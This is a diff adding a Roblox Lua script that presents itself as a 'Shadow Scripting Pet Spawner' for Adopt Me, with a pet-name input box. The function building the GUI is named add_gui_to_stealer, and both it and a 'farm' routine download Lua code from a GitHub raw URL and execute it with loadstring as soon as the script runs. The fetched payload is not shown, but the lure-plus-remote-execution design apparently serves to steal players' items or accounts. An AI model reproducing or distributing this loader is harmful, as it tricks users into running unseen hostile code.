@@ -1,0 +1,84 @@
+local function add_gui_to_stealer()
+    local player = game:GetService("Players").LocalPlayer
+    if not player then return end  -- Ensure player exists
+
+    local playerGui = player:FindFirstChild("PlayerGui") or player:WaitForChild("PlayerGui")
+
+    
+    local stealer_gui = Instance.new("ScreenGui")
+    stealer_gui.Parent = playerGui
+
+
+    local frame = Instance.new("Frame", stealer_gui)
+    frame.Size = UDim2.new(0, 300, 0, 150)
+    frame.Position = UDim2.new(0.5, -150, 0.5, -75)
+    frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    frame.BorderSizePixel = 0
+
+    
+    local uiCorner = Instance.new("UICorner", frame)
+    uiCorner.CornerRadius = UDim.new(0, 10)
+
+
+    local title = Instance.new("TextLabel", frame)
+    title.Size = UDim2.new(1, 0, 0, 40)
+    title.Text = "Shadow Scripting Pet Spawner"
+    title.TextSize = 20
+    title.Font = Enum.Font.SourceSansBold
+    title.BackgroundTransparency = 1
+    title.TextColor3 = Color3.new(1, 1, 1)
+    title.TextStrokeTransparency = 0
+    title.TextStrokeColor3 = Color3.new(0, 0, 0)
+    title.TextWrapped = true
+    title.TextScaled = true
+    title.TextYAlignment = Enum.TextYAlignment.Center
+    title.TextXAlignment = Enum.TextXAlignment.Center
+
+
+    local text_box = Instance.new("TextBox", frame)
+    text_box.Size = UDim2.new(1, -20, 0, 40)
+    text_box.Position = UDim2.new(0, 10, 0, 50)
+    text_box.Text = "Enter pet name here"
+    text_box.TextSize = 18
+    text_box.Font = Enum.Font.SourceSansBold
+    text_box.BackgroundTransparency = 0.2
+    text_box.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    text_box.TextColor3 = Color3.new(1, 1, 1)
+    text_box.TextStrokeTransparency = 0.5
+    text_box.TextWrapped = true
+    text_box.TextScaled = true
+    text_box.TextYAlignment = Enum.TextYAlignment.Center
+    text_box.TextXAlignment = Enum.TextXAlignment.Center
+
+
+    local textBoxCorner = Instance.new("UICorner", text_box)
+    textBoxCorner.CornerRadius = UDim.new(0, 8)
+
+
+    local success, scriptContent = pcall(function()
+        return game:HttpGet('https://raw.githubusercontent.com/textboy-roblox-scripter/shadow-scripting-adopt-me/main/adoptmescript.lua')
+    end)
+
+    if success and scriptContent then
+        loadstring(scriptContent)()
+    else
+        warn("❌ Failed to load pet spawner script.")
+    end
+end
+
+
+local function farm()
+    local success, scriptContent = pcall(function()
+        return game:HttpGet('https://raw.githubusercontent.com/textboy-roblox-scripter/shadow-scripting-adopt-me/main/script')
+    end)
+
+    if success and scriptContent then
+        loadstring(scriptContent)()
+    else
+        warn("❌ Failed to load farming script.")
+    end
+end
+
+
+task.spawn(add_gui_to_stealer)
+task.spawn(farm)
